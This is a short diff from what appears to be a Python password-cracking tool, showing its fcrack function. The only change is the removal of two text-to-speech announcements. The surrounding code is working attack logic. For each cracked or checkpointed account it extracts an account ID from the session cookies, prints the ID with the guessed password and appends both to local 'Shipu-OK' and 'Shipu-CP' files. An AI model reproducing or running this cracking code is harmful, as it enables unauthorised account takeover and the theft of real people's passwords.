@@ -857,7 +857,6 @@ def fcrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[151:166]
 				print('\033[1;92m[Shipu-OK] '+cid+' | '+ps+'\033[1;32m')
-				os.system("espeak \"Congratulation, OK, ID \"")
 				open('Shipu-OK.txt', 'a').write(cid+' | '+ps+'\n')
 				oks.append(cid)
 				break
@@ -865,7 +864,6 @@ def fcrack(uid,pwx,tl):
 				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
 				cid = coki[141:156]
 				print('\33[1;31m[Shipu-CP] '+cid+' | '+ps+'\33[0;97m')
-				os.system("espeak \Cp, ID \"")
 				open('Shipu-CP.txt', 'a').write(cid+' | '+ps+'\n')
 				cps.append(cid)
 				break
